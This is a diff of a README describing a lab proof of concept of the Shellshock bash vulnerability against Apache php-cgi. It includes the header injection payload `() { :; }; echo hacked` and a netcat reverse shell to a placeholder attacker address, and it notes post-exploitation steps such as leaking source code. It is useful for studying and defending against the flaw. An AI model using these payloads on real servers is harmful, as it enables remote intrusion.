@@ -15,13 +15,13 @@ Please note that all the following tests were done in a local controlled environ
  
  `env x='() { :;}; echo vulnerable' bash -c "echo this is a test`
 
-- Next, we set up an http server on a CentOS machine with Apache and php-cgi running a very simple script (see index.php). The JOY when it worked!
+- Next, we set up an http server on a CentOS machine with Apache and php-cgi running a very simple script (see index.php).
 
-- We started out by sending simple crafted HTTP packets that echoed text (inspired by [this blog post](http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html#.VCNinnVdW00).
+- We started out by sending simple crafted HTTP packets that echoed text (inspired by [this blog post](http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html#.VCNinnVdW00). The JOY when it worked!
 
-- We then tested more elaborate commands to discover what we had acces to. In our case, typing the command names as an apache user would not resolve the commands, yet calling them explicitly (`/usr/bin/command`) worked. We were able to run `find` commands and see all the files we had access to.
+- We then tested more elaborate commands to discover what we had access to. In our case, typing the command names as an apache user would not resolve the commands, yet calling them explicitly (`/usr/bin/command`) worked. We were then able, for example, to run `find` commands and see all the files we had access to.
 
-- At this point, it was annoying to type the commands individually. Fortunately, `nc` was installed on the server, so we used a reverse bind shell (`nc -lvp xxx` for the attacker and `nc -e /usr/bin/sh atckr_addr port`) for flexibility. At this point, we had a shell on the system, but running as apache user, all through a single HTTP packet with the right (or wrong?) headers.
+- At this point, it was annoying to type the commands individually. Fortunately, `nc` was installed on the server, so we used a reverse bind shell (`nc -lvp xxx` for the attacker and `nc -e /usr/bin/sh atckr_addr port` for the victim) for flexibility. At this point, we had a shell on the system, but running as an apache user, all through a single HTTP packet with the right (or wrong?) headers.
 
 - To simplify the process, we made a python script (in this repo) that calls netcat automatically.
 
@@ -32,8 +32,6 @@ With a shell on the victim's computer (limited as much as the apache user is on 
 - In our case, we only had write access to /tmp (which was actually a subdirectory within the real /tmp), so no straightforward way for a permanent backdoor.
 
 - We had access to the source code, which could be leaked afterwards.
-
-- Although we did not had the proper setup to try it, we think the attacker could reach the SSL keys (even easier than Heartbleed!)
 
 - Depending on the setup (and knowledge of the attacker), one could privilege escalate and break the apache jail.
 
@@ -55,7 +53,7 @@ Given our limited knowledge of bash internals and the short time window that we 
 
 - This can not really be exploited remotely by itself, it needs software that takes user input as a source for environment variable values.
 
-- So, when php-cgi is started by Apache through bash (which looks like the default behavior), certain HTTP headers are passed through env (e.g. referer, host and cookies). Our research indicates that other CGIs that don't pass these values through env (e.g. FastCGI communicates through sockets) are not affected (we tested it!)
+- So, when php-cgi is started by Apache through bash (which looks like the default behavior), certain HTTP headers are passed through env (e.g. referer, host, cookies, etc.). However, not all CGIs pass these values through env (e.g. FastCGI communicates through sockets), so they are not all affected (we tested it!)
 
 - Now, given carefully crafted HTTP headers (such as `() { :; }; echo hacked`), the next instruction through bash (e.g. a PHP `exec()`) will trigger the vulnerability.
 
